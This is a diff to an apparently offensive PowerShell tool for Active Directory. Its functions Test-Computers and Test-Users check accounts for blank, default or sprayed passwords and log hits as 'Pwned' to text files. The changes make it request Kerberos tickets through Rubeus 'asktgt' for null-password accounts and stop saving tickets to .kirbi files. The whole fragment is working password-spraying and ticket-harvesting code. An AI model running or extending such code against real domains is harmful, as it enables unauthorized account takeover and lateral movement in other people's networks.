@@ -173,7 +173,7 @@ Function Test-Computers {
 
       if ($valid) {
         if ($Asktgt) {
-          Load-Rubeus -command "asktgt /user:$_ /password:$pass /outfile:$_.kirbi /nowrap"
+          Load-Rubeus -command "asktgt /user:$_ /password:$pass /nowrap"
         }
         
         write-host Pwned computer: $_ using password: $_.Replace("`$","").ToLower() -ForegroundColor Cyan
@@ -183,6 +183,9 @@ Function Test-Computers {
             if ($valid) {
               write-host Pwned computer $_ no password -ForegroundColor Cyan
               Add-Content -Path .\pwnedcomputers.txt -Value "Pwned computer: $_ no password"
+              if ($Asktgt) {
+                Load-Rubeus -command "asktgt /user:$_ /password:$null /nowrap"
+              }
             }
           }
 
@@ -218,6 +221,9 @@ Function Test-Users {
       if ($valid) {
         write-host Pwned user: $_ no password -ForegroundColor Cyan
         Add-Content -Path .\pwnedusers.txt -Value "Pwned user: $_ no password"
+          if ($Asktgt) {
+                Load-Rubeus -command "asktgt /user:$_ /password:$null /nowrap"
+          }
       } 
 
         if ($Spraypass) {
@@ -228,7 +234,7 @@ Function Test-Users {
             write-host Pwned user: $_ using password: $Spraypass -ForegroundColor Cyan
             Add-Content -Path .\pwnedusers.txt -Value "Pwned user: $_ using password: $Spraypass"
               if ($Asktgt) {
-                Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /outfile:$_.kirbi /nowrap"
+                Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /nowrap"
               }
             
           } 
